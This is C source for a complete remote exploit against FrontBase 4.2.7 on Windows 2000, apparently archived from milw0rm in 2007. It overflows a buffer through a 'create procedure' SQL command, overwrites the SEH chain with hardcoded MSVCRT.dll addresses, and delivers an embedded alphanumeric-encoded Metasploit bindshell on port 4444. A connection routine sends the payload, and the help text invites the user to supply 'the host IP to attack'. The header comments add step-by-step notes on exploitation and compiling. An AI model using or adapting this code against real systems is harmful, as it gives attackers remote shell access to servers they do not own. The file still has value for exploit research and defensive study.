/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : Frontbase <= 4.2.7 for Windows
* Site           : http://www.frontbase.com
* Found by       : Netragard, L.L.C Advisory
* ----------------------------------------
* Exploit date   : 25.03.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows 2000 SP4 (will add other later)
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info:
*    The last Windows version of Frontbase that you can found on official site www.frontbase.com
* is the 4.2.7d and this version is patched, so the exploit will not work here, i have tested that 
* exploit on the 4.2.7 version under Windows 2000 SP4 (not patched) and it is working good.
* 
* The exploitation, as said in advisory, of this bug is easy: SEH and EIP overwrite methods.
* but in 'real' life the exploitation is more difficult, cause the server allows only alphanumeric
* bytes, like: 0x01 0x02 ... 0x7e 0x7f .
* other bytes: 0x80 ... 0xff come to server transformed:
*  0xEB will transform in two bytes 0xC2 0xAB
*  0xFF will transform in two bytes 0xC3 0xBF
* and etc...
* 
* so the exploitation become more difficult here, however in one place of buffer i send to the server byte 
* 0xff, with assumptions that i will get the bytes 0xC3 0xBF and that the buffer will be one byte longer.
* 
* for the correct exploitation i used some code from win32 SEH GetPC project and metasploit for the shellcodes.
* 
* so the exploit is:
*    send 3115 bytes to server + address to overwrite SEH.
*    in my case i sent 3114 bytes, cause one 0xff transformed in 2 symbols
* 
* ----------------------------------------
* Compiling:
*  To compile this exploit you need:
*    1. C:\usr\FrontBase\Include\FBCAccess copy to exploit folder.
*    2. Copy from C:\usr\FrontBase\lib\ file FBCAccess.lib to your exploit folder.
*    3. Select FBCAccess.lib in linker options
*    4. Compile.
* ----------------------------------------
* Thanks to:
*       Netragard, L.L.C Advisory   ( http://www.netragard.com -- "We make I.T. Safe." )
*       The Metasploit project      ( http://metasploit.com                            ) 
*       win32 SEH GetPC project     (                                                  ) 
*       Dreatica-FXP crew           (                                                  )
* ----------------------------------------
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include "FBCAccess/FBCAccess.h"

void usage(char * s);
void logo();
void prepare_shellcode(unsigned char * fsh, int sh);
void make_buffer(char * buf, int itarget, int sh);
int  validate_args( int port, int sh, int itarget);
int  send_buffer(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf);

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------

struct {
	const char *t ;
	unsigned long ret ;
} targets[]= 
		{								
			// we need alphanumeric addreses so this one found in MSVCRT.dll (there are a lot in it) 
			{"Windows 2000 SP4 no patches, MSVCRT.dll",				0x78014c40 },//pop, pop, ret
			{"Windows 2000 SP4 no pathces, MSVCRT.dll",						0x7803382b },//jmp ebx
			{NULL,													0x00000000 }
		};

struct {
	const char * name;
	char * shellcode;
}shellcodes[]={ 	
	 {"Spawn bindshell on port 4444", 
		 /* modified win32_bind -  EXITFUNC=seh LPORT=4444 Encoder=Alpha2 http://metasploit.com 
		    first jmp instructions replaced by alphanumeric code taken from the win32 SEH GetPC project. */
		"\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48\x50\x68"
		"\x59\x41\x41\x51\x68\x5A\x59\x59\x59\x59\x41\x41\x51\x51\x44\x44"
		"\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58\x56\x6A\x30\x50\x50\x54"
		"\x55\x50\x50\x61\x33\x30\x31\x30\x38\x39\x49\x49\x49\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x66"
		"\x58\x30\x42\x31\x50\x41\x42\x6b\x42\x41\x76\x32\x42\x42\x32\x41"
		"\x41\x30\x41\x41\x42\x58\x50\x38\x42\x42\x75\x38\x69\x39\x6c\x52"
		"\x4a\x5a\x4b\x42\x6d\x68\x68\x48\x79\x4b\x4f\x6b\x4f\x4b\x4f\x65"
		"\x30\x6c\x4b\x30\x6c\x31\x34\x71\x34\x4e\x6b\x42\x65\x65\x6c\x6e"
		"\x6b\x53\x4c\x43\x35\x62\x58\x55\x51\x4a\x4f\x4e\x6b\x72\x6f\x54"
		"\x58\x6c\x4b\x51\x4f\x77\x50\x53\x31\x78\x6b\x43\x79\x4e\x6b\x54"
		"\x74\x6c\x4b\x35\x51\x6a\x4e\x64\x71\x6f\x30\x6e\x79\x6e\x4c\x6d"
		"\x54\x6f\x30\x64\x34\x55\x57\x4f\x31\x59\x5a\x36\x6d\x36\x61\x59"
		"\x52\x5a\x4b\x4c\x34\x37\x4b\x62\x74\x47\x54\x46\x48\x70\x75\x4d"
		"\x35\x6c\x4b\x73\x6f\x64\x64\x33\x31\x4a\x4b\x43\x56\x4c\x4b\x44"
		"\x4c\x62\x6b\x6e\x6b\x63\x6f\x57\x6c\x65\x51\x6a\x4b\x77\x73\x56"
		"\x4c\x6c\x4b\x6e\x69\x62\x4c\x44\x64\x45\x4c\x55\x31\x6f\x33\x44"
		"\x71\x6b\x6b\x51\x74\x4e\x6b\x53\x73\x30\x30\x4e\x6b\x57\x30\x34"
		"\x4c\x6c\x4b\x64\x30\x37\x6c\x4e\x4d\x6c\x4b\x53\x70\x73\x38\x73"
		"\x6e\x30\x68\x4c\x4e\x62\x6e\x74\x4e\x38\x6c\x30\x50\x79\x6f\x6a"
		"\x76\x51\x76\x30\x53\x42\x46\x72\x48\x35\x63\x45\x62\x33\x58\x64"
		"\x37\x64\x33\x74\x72\x43\x6f\x33\x64\x4b\x4f\x78\x50\x52\x48\x38"
		"\x4b\x7a\x4d\x4b\x4c\x57\x4b\x62\x70\x69\x6f\x6e\x36\x71\x4f\x6e"
		"\x69\x4b\x55\x33\x56\x6c\x41\x4a\x4d\x76\x68\x74\x42\x63\x65\x51"
		"\x7a\x77\x72\x4b\x4f\x4a\x70\x63\x58\x6e\x39\x35\x59\x6b\x45\x4e"
		"\x4d\x30\x57\x4b\x4f\x38\x56\x50\x53\x50\x53\x42\x73\x51\x43\x70"
		"\x53\x70\x43\x32\x73\x52\x63\x76\x33\x59\x6f\x6e\x30\x55\x36\x33"
		"\x58\x76\x71\x71\x4c\x63\x56\x56\x33\x6e\x69\x59\x71\x4e\x75\x55"
		"\x38\x4c\x64\x55\x4a\x72\x50\x6b\x77\x56\x37\x4b\x4f\x4e\x36\x53"
		"\x5a\x56\x70\x32\x71\x33\x65\x69\x6f\x4e\x30\x62\x48\x39\x34\x4c"
		"\x6d\x74\x6e\x4a\x49\x63\x67\x69\x6f\x79\x46\x43\x63\x36\x35\x6b"
		"\x4f\x68\x50\x35\x38\x5a\x45\x70\x49\x6d\x56\x70\x49\x41\x47\x6b"
		"\x4f\x68\x56\x56\x30\x41\x44\x33\x64\x71\x45\x69\x6f\x4e\x30\x4d"
		"\x43\x53\x58\x5a\x47\x70\x79\x6b\x76\x73\x49\x41\x47\x49\x6f\x4e"
		"\x36\x63\x65\x4b\x4f\x4e\x30\x53\x56\x50\x6a\x35\x34\x53\x56\x41"
		"\x78\x61\x73\x30\x6d\x4c\x49\x4b\x55\x72\x4a\x72\x70\x76\x39\x45"
		"\x79\x58\x4c\x6b\x39\x59\x77\x31\x7a\x67\x34\x4c\x49\x49\x72\x70"
		"\x31\x6f\x30\x6c\x33\x6f\x5a\x69\x6e\x72\x62\x36\x4d\x4b\x4e\x53"
		"\x72\x34\x6c\x6a\x33\x6e\x6d\x62\x5a\x36\x58\x6c\x6b\x4c\x6b\x4e"
		"\x4b\x61\x78\x30\x72\x6b\x4e\x6d\x63\x46\x76\x4b\x4f\x44\x35\x32"
		"\x64\x39\x6f\x38\x56\x51\x4b\x70\x57\x52\x72\x70\x51\x32\x71\x53"
		"\x61\x42\x4a\x43\x31\x56\x31\x46\x31\x70\x55\x43\x61\x79\x6f\x6a"
		"\x70\x62\x48\x6e\x4d\x59\x49\x67\x75\x7a\x6e\x33\x63\x39\x6f\x59"
		"\x46\x63\x5a\x59\x6f\x4b\x4f\x76\x57\x6b\x4f\x6a\x70\x4c\x4b\x61"
		"\x47\x59\x6c\x6b\x33\x38\x44\x43\x54\x49\x6f\x58\x56\x36\x32\x59"
		"\x6f\x4e\x30\x43\x58\x68\x70\x4f\x7a\x54\x44\x73\x6f\x71\x43\x4b"
		"\x4f\x4e\x36\x6b\x4f\x78\x50\x66"
	 },	 
	{NULL , NULL }
};

// alphanumeric long back jump, using SEH method!
char jmptoshellcode[]=
	// at the time of jump we have in EBX the address where we jumped after SEH exploitation
	// so we can use it to jump [EBX-0C20]
	"\x56\x54\x58\x36\x33\x30\x56\x58\x50\x50\x5f\x53\x58\x66\x2d\x20" 
	"\x0C\x50\x59\x58\x64\x33\x3f\x64\x31\x38\x51\x57\x64\x31\x20\x6c";


int main(int argc, char **argv)
{
	char temp1[100], temp2[100];
	char * remotehost=NULL, * user=NULL, * password=NULL, * database=NULL, * dbpassword=NULL;
	char default_remotehost[]="127.0.0.1";
	char default_user[]="_SYSTEM";
	char default_password[]="";
	char default_database[]="";
	char default_dbpassword[]="";
	int port, itarget, sh;
	char c;		
	logo();
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}
	// set defaults		
	port=-1;
	itarget=0;
	sh=0;
	// ------------		
	while((c = getopt(argc, argv, "h:p:s:t:u:P:d:D:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 's':
				sscanf(optarg, "%d", &sh);
				sh--;
				break;
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;		
			case 'u':
				user=optarg;
				break; 
			case 'P':
				password=optarg;
				break; 
			case 'd':
				database=optarg;
				break; 
			default:
	            usage(argv[0]);
			return -1;
		}		
	}
	if(validate_args( port, sh, itarget)==-1) return -1;
	if(remotehost == NULL) remotehost=default_remotehost;
	if(user       == NULL) user=default_user;
	if(password   == NULL) password=default_password;
	if(dbpassword == NULL) dbpassword=default_dbpassword;
	if(database   == NULL) database=default_database;

	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	if(port!=-1)
	{
		sprintf(temp2, "%d", port);
		memset(temp1,0,sizeof(temp1));
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);
		printf(" #  Port    : %s%s# \n", temp2, temp1);
	}else
	{
		sprintf(temp2, "%s", database);
		memset(temp1,0,sizeof(temp1));
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);
		printf(" #  Database: %s%s# \n", temp2, temp1);
	}
	sprintf(temp2, "%s", user);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  User    : %s%s# \n", temp2, temp1);
	sprintf(temp2, "%s", database);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Database: %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Shellcde: %s%s# \n", temp2, temp1);	
	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) -1);	
	printf(" #  Target  : %s%s# \n", targets[itarget].t, temp1);	
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);
	
	char buf[20000];
	memset(buf,0,sizeof(buf));
	printf("[+] Constructing attacking buffer... ");
	fflush(stdout);
	make_buffer((char *)buf,itarget,sh);
	printf("done\n");

	if(send_buffer(remotehost,port, user, password, dbpassword, database, buf)==-1)
	{
		fprintf(stdout, "[-] Cannot exploit server %s\n", remotehost);		
		return -1;
	}
	return 0;
}

int validate_args(int port, int sh, int itarget)
{
	int i=0,x=0;
	for(i=0;shellcodes[i].name;i++)if(i==sh)x=1;
    if(x==0)
	{
		printf("[-] The shellcode number is invalid\n");
		return -1;
	}	
	x=0;
	for(i=0;targets[i].t;i++)if(i==itarget)x=1;
	if(x==0)
	{
		printf("[-] The target is invalid\n");
		return -1;
	}	
	return 1;
}

void prepare_shellcode( char * fsh, int sh)
{
	memcpy(fsh, shellcodes[sh].shellcode, strlen(shellcodes[sh].shellcode));	
}

void make_buffer(char * buf, int itarget, int sh)
{
	// -=[ prepare shellcode ]=-
	char * fsh;
	fsh = (char *) malloc ((strlen(shellcodes[sh].shellcode)+1) );
	memset(fsh, 0, (strlen(shellcodes[sh].shellcode)+1));	
	prepare_shellcode(fsh, sh);
	// -----------------
	
    // -=[ fill buffer here  ]=-
	memset(buf,0,sizeof(buf));
	char * cp = buf;

		// make vulnerable sql92 command to get exploit
	strcat(buf, "create procedure \"");
	cp=buf+strlen(buf);	

		// some useless bytes
	memset(cp, 'A', 7);  
	cp+=strlen((char *)cp);

		// shellcode
	memcpy(cp, fsh, strlen(fsh));
	cp+=strlen((char *)cp);

		// fill after shellcode
	memset(cp, 'A', 3045-strlen(fsh));  
	cp+=strlen((char *)cp);

		// alphanumeric long jump to our shellcode at the start of the buffer
	memcpy(cp, jmptoshellcode, strlen(jmptoshellcode));
	cp+=strlen((char *)cp);
	memset(cp, 'A', 59-strlen(jmptoshellcode));  
	cp+=strlen((char *)cp);
	
		// at this place in stack points EBX and RET will go here, so we need to jmp upper 
		// to prepare alphanumeric long jump

	*cp++ = '\x74'; // JNE ... at this point JNE will jump cause the last CMP was 'not equal'
	*cp++ = '\xff'; // this is not alphanumeric , but the server will transform \xff -> \xC3\xBF
					// so this will give us the JNE C3 and we will jump upper for 59 bytes
					// where we put a longer jump to our shellcode. This will add one byte more 
					// so we will send not 3115, but 3114 bytes to overwrite SEH.
	*cp++ = '\x41'; 

		// SEH chain overwrite
	*cp++ = (char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 24) & 0xff);
	
		// end of the sql92 command
	memcpy(cp, "\"()\n begin\n end;", strlen("\"()\n begin\n end;"));

	// -----------------
}

int send_buffer(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf)
{
	FBCDatabaseConnection * fbdc;
	FBCMetaData *meta;
	char sesn[]="dreatica-fxp";   
	if(database!=NULL) port = -1;
	fbcInitialize();	
   	if (port!=-1)
	{
		printf("[+] Connecting to %s:%d\n", host, port);
		fbdc = fbcdcConnectToDatabaseUsingPort(host, port, dbpassword); 
	}else
	{
		printf("[+] Connecting to %s to database %s\n", host, database);
		fbdc = fbcdcConnectToDatabase(database, host, dbpassword);
	}
	if (fbdc == NULL)
	{
		printf("[-] Cannot connect to %s\n", host);
		return -1;
	}	
	char * session_name=sesn;
	meta = fbcdcCreateSession(fbdc, session_name, user, password, "system_user");
	if (fbcmdErrorsFound(meta) != 0)
	{
		printf("[-] Failed to create session\n");
		FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
		char* msgs = fbcemdAllErrorMessages(emd);		
		fbcemdRelease(emd);
		free(msgs);
		fbcmdRelease(meta);
		fbcdcClose(fbdc);
		fbcdcRelease(fbdc);
		return -1;
	}   
	fbcmdRelease(meta);
	printf("[+] Sending %d bytes of buffer to server, check the shell\n", strlen(buf));
		// if exploit success, the app will stop here.
	meta = fbcdcExecuteDirectSQL(fbdc, buf);
	if (fbcmdErrorsFound(meta) != 0)
	{
		printf("[-] Failed to send buffer\n");
		FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
		char* msgs = fbcemdAllErrorMessages(emd);		
		fbcemdRelease(emd);
		free(msgs);
		fbcmdRelease(meta);
		fbcdcClose(fbdc);
		fbcdcRelease(fbdc);
		return -1;
	}
	fbcmdRelease(meta);
	return 1;
}


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------





void usage(char * s)
{	
	printf(" Usage:\n");
	printf("    %s -h <host> -p <port> -s <shellcode> -t <target> -u <user> -p <password> -d <database> -D <dbpassword>\n", s);
    printf(" ----------------------------------------------------------------------- \n");
	printf(" Arguments:\n");
	printf("\n");
	printf("      -h <host>       the host IP to attack\n");
	printf("      -p <port>       the port of server      (default: -1     )\n");
	printf("      -s <shellcode>  shellcode number        (default: 0      )\n");
	printf("      -t <target>     target number           (default: 0      )\n");
	printf("      -t <target>     target number           (default: 0      )\n");
	printf("      -u <user>       user name of frontbase  (default: _SYSTEM)\n");
	printf("      -p <passwrod>   user password           (default: <blank>)\n");
	printf("      -d <database>   database (if port = -1) (default: <blank>)\n");
	printf("      -d <dbpassword> database password       (default: <blank>)\n");
	printf("\n");
	printf("    Shellcodes:\n");
	for(int i=0; shellcodes[i].name!=0;i++)
	{
		printf("      %d. %s Size=%d\n",i+1,shellcodes[i].name, strlen(shellcodes[i].shellcode));				
	}	
	printf("\n");
	printf("    Targets:\n");
	for(int j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1,targets[j].t);
	}		
	printf("\n");
	printf(" Examples:\n");
	printf("    %s -h 127.0.0.1 -d NewDB\n", s);
	printf("    %s -h 127.0.0.1 -p 1155 -u root -p dta -D dta -t 1\n", s);
	printf(" ----------------------------------------------------------------------- \n");	
	
	
}

void logo()
{
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : Frontbase <= 4.2.7 for Windows                           # \n");
	printf(" #  Author  : Heretic2 (heretic2x@gmail.com)                           # \n");
	printf(" #  Version : 1.1                                                      # \n");
	printf(" #  System  : Windows 2000 SP4                                         # \n");
	printf(" #  Date    : 25.03.2007                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

// milw0rm.com [2007-03-25]